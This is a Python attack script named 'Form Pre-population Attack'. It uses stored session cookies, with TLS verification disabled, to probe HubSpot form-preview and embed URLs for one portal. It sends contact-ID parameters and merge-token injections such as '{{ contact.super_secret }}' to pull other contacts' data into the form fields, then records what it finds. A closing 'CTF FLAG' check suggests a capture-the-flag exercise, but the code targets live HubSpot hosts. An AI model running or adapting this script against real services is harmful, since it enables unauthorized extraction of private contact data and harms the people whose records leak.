#!/usr/bin/env python3
"""
Form Pre-population Attack
Try to get forms to pre-populate with contact data using query parameters
"""

import requests
import json
import os
import urllib3
from dotenv import load_dotenv
import re
from urllib.parse import urlencode

urllib3.disable_warnings()
load_dotenv()

SESSION_COOKIES = os.getenv('HUBSPOT_COOKIES')
TARGET_PORTAL = '46962361'

print("="*80)
print("FORM PRE-POPULATION ATTACK")
print("="*80)

findings = []

session = requests.Session()
for cookie in SESSION_COOKIES.split('; '):
    if '=' in cookie:
        key, value = cookie.split('=', 1)
        session.cookies.set(key, value, domain='.hubspot.com')

# The public forms we found
form_ids = [1, 3, 4, 5, 6, 8, 13, 18, 1000]

for form_id in form_ids:
    print(f"\n{'='*80}")
    print(f"TESTING FORM {form_id} PRE-POPULATION")
    print('='*80)

    # Try different pre-population parameters
    prepop_tests = [
        # Standard HubSpot pre-population
        {'email': 'contact1@portal46962361.com', 'firstname': '{{ contact.firstname }}'},
        {'email': 'contact1@portal46962361.com', 'contactId': '1'},
        {'email': 'contact1@portal46962361.com', 'vid': '1'},
        {'email': 'contact1@portal46962361.com', 'hs_object_id': '1'},

        # Try to reference existing contact
        {'hsContactId': '1'},
        {'hsPrevFormContactId': '1'},

        # UTK (user token cookie) - might pull contact data
        {'hutk': 'test'},

        # Try merge token syntax
        {'email': '{{ contact.email }}', 'firstname': '{{ contact.firstname }}', 'super_secret': '{{ contact.super_secret }}'},
    ]

    for i, params in enumerate(prepop_tests, 1):
        query_string = urlencode(params)
        url = f'https://app.hubspot.com/form-preview/{TARGET_PORTAL}/{form_id}?{query_string}'

        print(f"\n  [Test {i}] {url[:100]}...")

        try:
            r = session.get(url, verify=False, timeout=10)

            print(f"    Status: {r.status_code}")

            if r.status_code == 200:
                # Check if form was pre-populated with actual data
                if 'value="' in r.text:
                    # Extract pre-populated values
                    value_pattern = r'<input[^>]*name="([^"]*)"[^>]*value="([^"]*)"'
                    matches = re.findall(value_pattern, r.text)

                    if matches:
                        print(f"    Pre-populated fields:")
                        for field_name, field_value in matches:
                            if field_value and field_value not in ['', 'text', 'email', 'submit']:
                                print(f"      {field_name}: {field_value}")

                                # Check if we got actual contact data
                                if field_value.lower() not in [field_name.lower(), 'firstname', 'email', '{{ contact.firstname }}', '{{ contact.email }}']:
                                    print(f"      *** POTENTIAL CONTACT DATA! ***")

                                    findings.append({
                                        'form_id': form_id,
                                        'params': params,
                                        'field': field_name,
                                        'value': field_value
                                    })
        except:
            pass

    # Also try the embed URL
    embed_url = f'https://share.hsforms.com/{TARGET_PORTAL}/{form_id}'

    print(f"\n  [Embed Test] {embed_url}")

    try:
        r = session.get(embed_url, verify=False, timeout=10)

        print(f"    Status: {r.status_code}")

        if r.status_code == 200:
            # Check for embedded data
            if 'firstname' in r.text.lower():
                # Look for actual values
                patterns = [
                    r'"firstname"\s*:\s*"([^"]+)"',
                    r'value="([^"]*)"[^>]*name="firstname"',
                ]

                for pattern in patterns:
                    matches = re.findall(pattern, r.text, re.I)
                    real_values = [m for m in matches if m.lower() not in ['firstname', 'text', '']]

                    if real_values:
                        print(f"    *** FOUND FIRSTNAME VALUES: {real_values[:3]} ***")

                        findings.append({
                            'form_id': form_id,
                            'source': 'embed',
                            'values': real_values
                        })
    except:
        pass

print("\n" + "="*80)
print("FORM PRE-POPULATION ATTACK COMPLETE")
print("="*80)

if findings:
    print(f"\n*** FOUND {len(findings)} POTENTIAL DATA LEAKS! ***\n")

    with open('/home/user/Hub/findings/prepopulation_findings.json', 'w') as f:
        json.dump(findings, f, indent=2)

    for finding in findings:
        print(f"\n{json.dumps(finding, indent=2)}")

        if 'super_secret' in json.dumps(finding).lower():
            print(f"\n*** CTF FLAG FOUND! ***")
else:
    print("\nNo pre-population data leakage found.")
